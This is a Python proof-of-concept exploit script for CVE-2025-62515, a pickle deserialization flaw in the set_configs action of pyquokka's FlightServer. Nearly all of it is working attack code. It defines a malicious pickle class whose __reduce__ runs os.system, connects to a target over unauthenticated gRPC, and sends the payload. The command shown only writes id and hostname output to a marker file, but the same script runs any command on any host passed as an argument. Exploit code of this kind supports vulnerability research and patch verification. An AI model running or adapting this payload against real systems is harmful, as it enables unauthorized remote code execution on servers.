#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : pyquokka FlightServer — Pickle Deserialization RCE (set_configs)
# CVE            : CVE-2025-62515
# Vendor         : marsupialtail (pyquokka)
# Product        : pyquokka FlightServer
# Affected       : All versions through 0.3.2 (UNPATCHED)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (CRITICAL)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-62515 — Vector 1: set_configs Action RCE

Demonstrates Remote Code Execution (RCE) through the "set_configs" action handler
in pyquokka's FlightServer. The server deserializes attacker-controlled pickle data
at line 283 of flight.py without any validation or authentication.

ATTACK CHAIN:
  1. Connect to FlightServer on gRPC port 5005 (no auth required)
  2. Send do_action("set_configs", <malicious_pickle_payload>)
  3. Server calls pickle.loads(action.body.to_pybytes()) at line 283
  4. pickle __reduce__() triggers os.system() — RCE achieved

PREREQUISITES:
  - pyarrow (client-side only): pip install pyarrow
  - Network access to the target FlightServer (default port 5005, gRPC)

REFERENCES:
  - CVE-2025-62515
  - https://github.com/marsupialtail/quokka/security/advisories/GHSA-f74j-gffq-vm9p
"""

import sys
import pickle
import os

# pyarrow is the only external dependency needed on the attacker side
import pyarrow.flight


# === Step 1: Craft malicious pickle payload ===
# Python's pickle protocol supports a __reduce__() dunder method that is
# called during deserialization. By defining __reduce__ to return a tuple
# of (callable, args), we can execute arbitrary code on the server.

class RCEPayload:
    """
    Malicious pickle class that executes an OS command when deserialized.

    When pickle.loads() encounters this object, it calls __reduce__(),
    which returns (os.system, (<command>,)). The pickle module then
    invokes os.system(<command>) to reconstruct the object — achieving RCE.
    """
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))


def exploit(target_host, target_port=5005):
    """
    Exploit CVE-2025-62515 via the set_configs action handler.

    The do_action() method in FlightServer directly calls:
        pickle.loads(action.body.to_pybytes())
    on the "set_configs" action type (line 283), with no authentication
    or input validation. Code execution occurs inside pickle.loads()
    before any post-deserialization checks.
    """

    target_uri = f"grpc://{target_host}:{target_port}"
    marker_file = "/tmp/cve-2025-62515-pwned"

    print(f"[*] CVE-2025-62515 PoC — pickle.loads() RCE via set_configs action")
    print(f"[*] Target: {target_uri}")
    print()

    # Step 2: Connect to the Flight server (no authentication required)
    print(f"[+] Connecting to FlightServer at {target_uri}...")
    try:
        client = pyarrow.flight.connect(target_uri)
        # Verify the server is alive by listing actions
        actions = list(client.list_actions())
        action_names = [a.type for a in actions]
        print(f"[+] Connected! Available actions: {action_names}")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)

    # Note: The "set_configs" action is handled in do_action() (line 282) but is NOT
    # listed in list_actions() (line 267). The server will still process it when sent.
    # We verify we're talking to a pyquokka FlightServer by checking for known actions.
    if "cache_garbage_collect" not in action_names:
        print("[-] Does not appear to be a pyquokka FlightServer")
        sys.exit(1)
    print(f"[+] Confirmed pyquokka FlightServer (set_configs handled but not listed)")

    # Step 4: Craft the RCE payload
    # This command creates a marker file and writes system info to prove code execution
    rce_command = (
        f"id > {marker_file} && "
        f"echo '---' >> {marker_file} && "
        f"hostname >> {marker_file} && "
        f"echo '---' >> {marker_file} && "
        f"echo 'CVE-2025-62515 RCE demonstrated' >> {marker_file}"
    )

    payload = RCEPayload(rce_command)
    malicious_bytes = pickle.dumps(payload)

    print(f"[+] Crafted malicious pickle payload ({len(malicious_bytes)} bytes)")
    print(f"[+] Payload command: id > {marker_file} && hostname >> {marker_file} && ...")
    print()

    # Step 5: Send the malicious payload via the set_configs action
    # The server will call pickle.loads(action.body.to_pybytes()) which triggers
    # our __reduce__() method, executing the OS command
    print(f"[+] Sending malicious 'set_configs' action...")

    action = pyarrow.flight.Action("set_configs", malicious_bytes)

    try:
        results = list(client.do_action(action))
        print(f"[+] Server returned results (unexpected — payload may not have triggered)")
        for r in results:
            print(f"    Result: {r.body.to_pybytes()}")
    except pyarrow.flight.FlightServerError as e:
        # This is EXPECTED behavior:
        # After pickle.loads() executes our payload, it returns the result of
        # os.system() (an int). The server then tries to iterate this int as a
        # dict (for key in config_dict:), which raises a TypeError.
        # The Arrow Flight framework catches this and returns it as a gRPC error.
        # The RCE has ALREADY happened at this point.
        print(f"[+] Server returned error (EXPECTED — RCE already executed):")
        error_msg = str(e)
        if len(error_msg) > 200:
            error_msg = error_msg[:200] + "..."
        print(f"    {error_msg}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

    print()
    print(f"[*] Exploit payload delivered. RCE executed during pickle.loads().")
    print(f"[*] Verify by checking for '{marker_file}' inside the target container:")
    print(f"    docker exec <container> cat {marker_file}")
    print()

    return marker_file


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5005

    exploit(target, port)
